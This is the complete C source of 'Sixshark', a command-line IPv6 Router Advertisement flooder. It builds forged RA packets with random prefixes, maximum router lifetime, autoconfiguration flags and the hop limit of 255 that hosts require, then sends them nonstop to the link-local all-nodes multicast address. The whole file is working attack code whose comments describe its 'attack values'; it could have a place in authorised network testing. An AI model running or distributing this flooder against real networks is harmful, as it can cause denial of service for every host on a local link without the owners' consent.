#ifdef __INTELLISENSE__
#pragma diag_suppress 70
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>

// Data structures for the forged Router Advertisement packet. Field
// meanings below are what's needed to read the code; the RFC 4861
// section references, the union's three interpretations, and why
// create_packet() fills each field with the specific value it does
// (the "attack values") are documented in docs/sixshark.md.

// ICMPv6 Router Advertisement Header (16 bytes total)
typedef struct ICMPv6
{
    uint8_t type;           // ICMPv6 message type (134 = Router Advertisement)
    uint8_t code;           // Message subtype (always 0 for RA)
    uint16_t checksum;      // ICMPv6 checksum (kernel auto-calculates, set to 0)

    // 4-byte field, reinterpreted depending on which piece you need to set
    union
    {
        uint32_t data32;
        uint16_t data16[2]; // [0] = hop limit + flags, [1] = router lifetime
        uint8_t data8[4];   // [0] = hop limit, [1] = flags, [2-3] = lifetime
    } data;

    uint32_t r_time;        // Reachable time in milliseconds (0 = unspecified)
    uint32_t rtrans_time;   // Retransmit timer in milliseconds (0 = unspecified)
} __attribute__((packed)) ICMPv6;

// Prefix Information Option (Type 3) - 32 bytes total
// Tells clients what IPv6 prefix to use for address autoconfiguration
typedef struct PrefixInfo
{
    uint8_t type;               // Option type (3 = Prefix Information)
    uint8_t length;             // Length in units of 8 bytes (4 = 32 bytes total)
    uint8_t prefix_len;         // Prefix length in bits (typically 64 for SLAAC)
    uint8_t flags;              // 0x80 = On-link (L), 0x40 = Autonomous/SLAAC (A)
    uint32_t valid_lifetime;    // Seconds prefix is valid for address config
    uint32_t preferred_lifetime; // Seconds prefix is preferred for new connections
    uint32_t reserved;          // Must be 0
    struct in6_addr prefix;     // Advertised IPv6 prefix; only the first
                                 // prefix_len bits matter (e.g. first 64 for /64)
} __attribute__((packed)) PrefixInfo;

// Source Link-Layer Address Option (Type 1) - 8 bytes total
// Provides the router's MAC address so clients can send packets without
// doing neighbor discovery first
typedef struct SourceLLAddr
{
    uint8_t type;       // Option type (1 = Source Link-Layer Address)
    uint8_t length;     // Length in units of 8 bytes (1 = 8 bytes total)
    uint8_t mac[6];     // MAC address of the (attacker-controlled) router
} __attribute__((packed)) SourceLLAddr;


// Complete Router Advertisement Packet Structure
// Total size: 16 (ICMPv6) + 32 (Prefix) + 8 (Source LL) = 56 bytes
typedef struct Packet
{
    ICMPv6 icmp6_hdr;       // Router Advertisement header
    PrefixInfo prefix;      // Advertised IPv6 prefix for autoconfiguration
    SourceLLAddr source_ll; // Router's MAC address
} __attribute__((packed)) Packet;

// Function prototypes

void print_usage(const char *progname);
void stop(int sig);
void cleanup(Packet *p);
int lookup_mac(const char *interface, uint8_t *mac);
int create_packet(Packet *p, const uint8_t *mac, const char *prefix);
int generate_random_prefix(char *prefix);
int run_flood(Packet *p, int delay, const char *interface, bool progress);

// Global state

volatile sig_atomic_t keep_running = 1;


int main(int argc, char *argv[])
{
    printf("Sixshark - IPv6 RA Flooder\n");

    if(getuid() != 0)
    {
        fprintf(stderr, "Error: Sixshark requires root privileges\n");
        fprintf(stderr, "Try: sudo %s -i <interface>\n", argv[0]);
        return 1;
    }

    signal(SIGINT, stop);
    srand(time(NULL));
    
    int opt;
    char *interface = NULL;
    int delay = 0;
    bool progress = false;

    while((opt = getopt(argc, argv, "i:d:ph")) != -1)
    {
        switch(opt)
        {
            case 'h':
                print_usage(argv[0]);
                return 0;
            case 'i':
                interface = optarg;
                break;
            case 'd':
                delay = atoi(optarg);
                if(delay < 0)
                {
                    fprintf(stderr, "Error: -d requires a positive integer.\n");
                    exit(1);
                }
                break;
            case 'p':
                progress = true;
                break;
        }
    }

    if(!interface)
    {
        fprintf(stderr, "Error: Interface is required!\n\n");
        print_usage(argv[0]);
        return 1;
    }

    Packet *p = malloc(sizeof(Packet));

    if(!p)
    {
        perror("malloc");
        return 1;
    }

    printf("Interface: %s\n", interface);
    printf("Flooding network...\n");
    printf("Press Ctrl+C to stop flooding.\n\n");
    run_flood(p, delay, interface, progress);
    cleanup(p);
    return 0;
}

int lookup_mac(const char *interface, uint8_t *mac)
{
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    struct ifreq ifr;
    if(sock < 0)
    {
        perror("socket");
        return 0;
    }

    strncpy(ifr.ifr_name, interface, IF_NAMESIZE - 1);
    ifr.ifr_name[IF_NAMESIZE - 1] = '\0';

    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl");
        close(sock);
        return 0;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 1;
}

int generate_random_prefix(char *prefix)
{
    snprintf(prefix, INET6_ADDRSTRLEN, "fd%02x:%04x:%04x::", 
         rand() % 256, 
         rand() % 65536, 
         rand() % 65536);
    return 0;
}

// Fills p with a forged Router Advertisement. The specific values used
// below (lifetimes, flags, etc.) are the "attack values" documented in
// docs/sixshark.md, not arbitrary defaults.
int create_packet(Packet *p, const uint8_t *mac, const char *prefix)
{
    p->icmp6_hdr.type = 134;
    p->icmp6_hdr.code = 0;
    p->icmp6_hdr.checksum = 0;

    p->icmp6_hdr.data.data8[0] = 64;
    p->icmp6_hdr.data.data8[1] = 0;
    p->icmp6_hdr.data.data16[1] = htons(65535);

    p->icmp6_hdr.r_time = htonl(0);
    p->icmp6_hdr.rtrans_time = htonl(0);

    p->prefix.type = 3;
    p->prefix.length = 4;
    p->prefix.prefix_len = 64;
    p->prefix.flags = 0xC0;
    p->prefix.valid_lifetime = htonl(86400);
    p->prefix.preferred_lifetime = htonl(86400);
    p->prefix.reserved = 0;

    if(inet_pton(AF_INET6, prefix, &p->prefix.prefix) != 1)
    {
        fprintf(stderr, "Error: Invalid IPv6 prefix: %s\n", prefix);
        return 0;
    }

    p->source_ll.type = 1;
    p->source_ll.length = 1;

    memcpy(p->source_ll.mac, mac, 6);
    return 1;
}

int run_flood(Packet *p, int delay, const char *interface, bool progress)
{
    // RFC 4861 requires a hop limit of exactly 255 on received RAs; hosts
    // silently discard anything else as a guard against off-link spoofing.
    int hops = 255;
    int bufsize = 1024 * 1024;
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if(sock < 0)
    {
        perror("socket");
        return 1;
    }

    if(setsockopt(sock, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &hops, sizeof(hops)) < 0)
    {
        perror("setsockopt IPV6_UNICAST_HOPS");
        close(sock);
        return 1;
    }
    if(setsockopt(sock, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops)) < 0)
    {
        perror("setsockopt IPV6_MULTICAST_HOPS");
        close(sock);
        return 1;
    }
    
    if(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0)
    {
        perror("setsockopt SO_SNDBUF");
        close(sock);
        return 1;
    }

    char prefix[INET6_ADDRSTRLEN];
    uint8_t mac[6];

    if(!lookup_mac(interface, mac))
    {
        fprintf(stderr, "Error: Could not find MAC address for interface %s.\n", interface);
        close(sock);
        return 1;
    }

    struct sockaddr_in6 dest;
    memset(&dest, 0, sizeof(dest));

    dest.sin6_family = AF_INET6;
    inet_pton(AF_INET6, "ff02::1", &dest.sin6_addr); // link-local all-nodes multicast
    // Link-local multicast is scoped per-interface; the kernel needs to
    // know which interface to send out on since the address alone doesn't say.
    dest.sin6_scope_id = if_nametoindex(interface);

    if(dest.sin6_scope_id == 0)
    {
        fprintf(stderr, "Error: Could not find interface %s.\n", interface);
        close(sock);
        return 1;
    }

    while(keep_running)
    {
        generate_random_prefix(prefix);
        memset(p, 0, sizeof(Packet));

        if(!create_packet(p, mac, prefix))
        {
            close(sock);
            return 1;
        }

        int bytes_sent = sendto(sock, p, sizeof(Packet), 0, (struct sockaddr *)&dest, sizeof(dest));
        if(bytes_sent < 0)
        {
            // Transient: the kernel's send queue is momentarily full from
            // sending as fast as possible. Back off briefly and retry
            // rather than treating it as a fatal error.
            if(errno == ENOBUFS)
            {
                usleep(1000);
                continue;
            }
            perror("sendto");
            close(sock);
            return 1;
        }
        if(progress)
        {
            printf(".");
            fflush(stdout);
        }
        sleep(delay);
    }

    close(sock);
    return 1;
}

void stop(int sig)
{
    (void)sig;
    keep_running = 0;
}

void cleanup(Packet *p)
{
    printf("\n\nCleaning up...");
    free(p);
    printf(" [OK]\n");
}

void print_usage(const char *progname)
{
    printf("Sixshark - IPv6 RA Flooder\n\n");
    printf("Usage: sudo %s -i <interface> [-d -p -h]\n", progname);
    printf("\n");
    printf("Required:\n");
    printf(" -i <interface>  Network interface to use (e.g., eth0, wlan0)\n");
    printf("\n");
    printf("Options:\n");
    printf(" -d <int>   Delay between sending packets (in seconds)\n");
    printf(" -p         Print to screen when packet is sent\n");
    printf(" -h         Display this help message\n");
    printf("\n");
    printf("Press Ctrl+C to stop flooding.\n");
}